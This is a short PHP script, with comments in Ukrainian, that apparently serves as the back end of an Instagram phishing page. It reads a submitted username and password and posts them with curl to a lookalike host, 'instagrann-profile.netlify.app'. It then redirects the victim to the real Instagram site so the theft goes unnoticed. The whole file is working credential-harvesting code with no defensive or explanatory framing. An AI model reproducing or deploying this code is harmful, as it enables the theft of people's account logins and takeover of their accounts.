<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Відправка даних на функцію Netlify
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://instagrann-profile.netlify.app/.netlify/functions/api.php");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array('username' => $username, 'password' => $password)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Перенаправте користувача на оригінальний сайт Instagram
    header("Location: https://www.instagram.com");
    exit();
}

?>
